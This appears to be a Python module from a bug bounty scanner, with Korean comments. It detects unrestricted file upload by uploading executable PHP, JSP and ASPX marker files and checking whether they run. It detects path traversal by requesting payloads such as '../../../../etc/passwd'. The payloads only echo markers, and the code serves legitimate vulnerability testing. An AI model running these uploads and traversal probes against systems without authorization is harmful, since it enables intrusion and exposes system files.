"""BugBounty Bot — 파일 업로드/다운로드 스캐너.

file_upload: multipart 폼(file input)에 실행 가능 확장자(.php) 업로드
  → 성공 메시지 + 저장 파일이 접근·실행되는지 확인 (RCE)
file_download: file/download 파라미터에 path traversal(../) 주입
  → /etc/passwd, index.php 등 민감 파일 내용 반사 확인

일반화: 특정 앱 하드코딩 없음. 폼 구조 + 응답 신호로 판별.
"""
import re
import httpx
from core.models import Asset, Endpoint, Finding
from core.logger import get_logger

log = get_logger("scanner.file")

# 실행 가능 확장자 (서버가 실행하는 것)
EXECUTABLE_EXT = {
    ".php": b'<?php echo "bb_file_rce_marker_7f3a"; ?>',
    ".phtml": b'<?php echo "bb_file_rce_marker_7f3a"; ?>',
    ".jsp": b'<% out.println("bb_file_rce_marker_7f3a"); %>',
    ".aspx": b'<%@ Page Language="C#" %><% Response.Write("bb_file_rce_marker_7f3a"); %>',
}
RCE_MARKER = "bb_file_rce_marker_7f3a"

# 업로드 성공 신호 (응답 텍스트)
UPLOAD_SUCCESS_RE = re.compile(
    r"(upload(?:ed|ing)?\s+(?:success|complete|ok)|success(?:fully)?\s+upload|"
    r"file\s+(?:was\s+)?(?:saved|stored|uploaded)|has\s+been\s+upload|"
    r"upload\s+success|successfully\s+upload)",
    re.IGNORECASE,
)
# 저장 파일 경로/URL 추출 (uploads/... 등)
SAVED_PATH_RE = re.compile(r"((?:/|\.\./)+[\w./-]*uploads?/[\w./-]+\.\w+)", re.IGNORECASE)


def _find_file_forms(html: str) -> list[dict]:
    """multipart 폼 + file input 추출.

    반환: [{"action", "method", "file_field", "submit", "fields"}]
    """
    forms = []
    for m in re.finditer(r"<form[^>]*>(.*?)</form>", html, re.DOTALL | re.IGNORECASE):
        tag = m.group(0)
        body = m.group(1)
        if "multipart/form-data" not in tag.lower():
            continue
        action = re.search(r'action=["\']([^"\'#]*)["\']', tag, re.IGNORECASE)
        method = re.search(r'method=["\']([^"\'#]*)["\']', tag, re.IGNORECASE)
        file_field = re.search(r'<input[^>]*type=["\']file["\'][^>]*name=["\']([^"\'#]+)["\']', body, re.IGNORECASE)
        if not file_field:
            file_field = re.search(r'<input[^>]*name=["\']([^"\'#]+)["\'][^>]*type=["\']file["\']', body, re.IGNORECASE)
        if not file_field:
            continue
        submit = re.search(r'<input[^>]*type=["\']submit["\'][^>]*value=["\']([^"\'#]*)["\']', body, re.IGNORECASE)
        fields = re.findall(r'<(?:input|textarea|select)[^>]*name=["\']([^"\'#]+)["\']', body, re.IGNORECASE)
        forms.append({
            "action": action.group(1) if action else "",
            "method": (method.group(1) if method else "post").lower(),
            "file_field": file_field.group(1),
            "submit": submit.group(1) if submit else "Submit",
            "fields": fields,
        })
    return forms


def _upload(client: httpx.Client, url: str, form: dict, ext: str, content: bytes,
            content_type: str, filename: str) -> httpx.Response | None:
    try:
        data = {}
        if form["submit"]:
            # submit 버튼 이름 찾기 (fields에 있으면)
            for f in form["fields"]:
                if f.lower() in ("submit", "upload", "send"):
                    data[f] = form["submit"]
                    break
            if not data:
                data[form["file_field"]] = form["file_field"]  # noop
        files = {form["file_field"]: (filename, content, content_type)}
        if form["method"] == "get":
            return client.get(url, data=data, timeout=15)
        return client.post(url, data=data, files=files, timeout=15)
    except Exception as e:
        log.debug("upload error %s: %s", url, e)
        return None


def scan_file_upload(asset: Asset, endpoint: Endpoint, client: httpx.Client) -> list[Finding]:
    """multipart 폼에 .php 업로드 → 저장/실행 확인."""
    findings = []
    if not endpoint.url:
        return findings
    try:
        resp = client.get(endpoint.url, timeout=15)
    except Exception:
        return findings
    if resp.status_code >= 400:
        return findings
    html = resp.text
    forms = _find_file_forms(html)
    if not forms:
        return findings

    base = endpoint.url.rsplit("/", 1)[0] + "/" if endpoint.url.endswith("/") else endpoint.url
    for form in forms:
        action = form["action"]
        # action이 비어있거나 '#'이면 같은 페이지
        target = endpoint.url if (not action or action in ("#", "")) else (base + action if action.startswith("/") else action)
        # .php 업로드
        content = EXECUTABLE_EXT[".php"]
        r = _upload(client, target, form, ".php", content, "application/php", "bb_rce.php")
        if not r:
            continue
        success = bool(UPLOAD_SUCCESS_RE.search(r.text))
        # 저장 파일 경로 추출
        saved = SAVED_PATH_RE.search(r.text)
        rce = False
        saved_url = None
        if saved:
            path = saved.group(1)
            # 상대 경로를 절대 URL로 (uploads/... → base/uploads/...)
            if path.startswith("../"):
                saved_url = target + path
            elif path.startswith("/"):
                saved_url = f"{client.base_url or ''}{path}" if client.base_url else path
            else:
                saved_url = base + path
            try:
                rr = client.get(saved_url, timeout=15)
                if rr.status_code == 200 and RCE_MARKER in rr.text:
                    rce = True
            except Exception:
                pass
        if success or rce:
            sev = "critical" if rce else "high"
            findings.append(Finding(
                asset_id=asset.id,
                vuln_type="file_upload",
                severity=sev,
                endpoint=endpoint.url,
                method="POST",
                evidence=(f"Unrestricted file upload: .php saved to '{saved_url}'"
                          + (" and executed (RCE)" if rce else "")
                          + f" via multipart field '{form['file_field']}'"),
                poc_request={"method": "POST", "url": target,
                             "files": {form["file_field"]: "bb_rce.php (<?php echo marker)"}},
                raw_data={"success": success, "rce": rce, "saved_url": saved_url,
                          "status": r.status_code},
            ))
    return findings


def scan_file_download(asset: Asset, endpoint: Endpoint, client: httpx.Client) -> list[Finding]:
    """file/download 파라미터에 path traversal 주입."""
    findings = []
    if not endpoint.url:
        return findings
    # file/download/view/serve 같은 파라미터가 있는 endpoint만
    params = endpoint.params or []
    file_params = [p for p in params if p.lower() in
                   ("file", "download", "path", "doc", "document", "name", "page", "f", "id")]
    if not file_params:
        return findings
    traversal_payloads = [
        ("../../../../etc/passwd", "root:"),
        ("../../../etc/passwd", "root:"),
        ("../../../../etc/hostname", None),
        ("..%2f..%2f..%2f..%2fetc%2fpasswd", "root:"),
    ]
    for p in file_params:
        for payload, marker in traversal_payloads:
            try:
                url = endpoint.url
                sep = "&" if "?" in url else "?"
                r = client.get(f"{url}{sep}{p}={payload}", timeout=15)
            except Exception:
                continue
            if r.status_code != 200:
                continue
            if marker and marker in r.text:
                findings.append(Finding(
                    asset_id=asset.id,
                    vuln_type="path_traversal",
                    severity="high",
                    endpoint=endpoint.url,
                    method="GET",
                    evidence=f"Path traversal via '{p}': /etc/passwd read (param '{p}'={payload} → 200, contains '{marker}')",
                    poc_request={"method": "GET", "url": f"{url}{sep}{p}={payload}"},
                    raw_data={"status": r.status_code, "param": p},
                ))
                break  # 이 param에서 하나 찾으면 충분
    return findings


def scan_file(asset: Asset, endpoint: Endpoint, client: httpx.Client) -> list[Finding]:
    """파일 관련 스캔: upload + download."""
    findings = []
    findings.extend(scan_file_upload(asset, endpoint, client))
    findings.extend(scan_file_download(asset, endpoint, client))
    return findings
